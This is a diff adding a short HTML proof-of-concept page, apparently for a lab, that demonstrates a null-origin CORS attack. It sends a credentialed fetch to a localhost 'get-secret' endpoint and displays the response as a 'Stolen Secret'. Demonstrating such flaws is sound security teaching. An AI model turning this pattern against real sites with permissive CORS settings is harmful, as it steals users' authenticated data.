@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Null Origin CORS Attack</title></head>
+<body>
+    <h1>Null Origin CORS Attack</h1>
+    <button onclick="steal()">Steal Secret</button>
+    <p id="output"></p>
+
+    <script>
+        function steal() {
+            fetch("http://localhost:3000/get-secret", {
+                method: "GET",
+                credentials: "include"
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById("output").innerText = "Stolen Secret: " + data.secret;
+                console.log("Stolen Secret:", data);
+            })
+            .catch(err => {
+                document.getElementById("output").innerText = "Failed to steal: " + err;
+            });
+        }
+    </script>
+</body>
+</html>
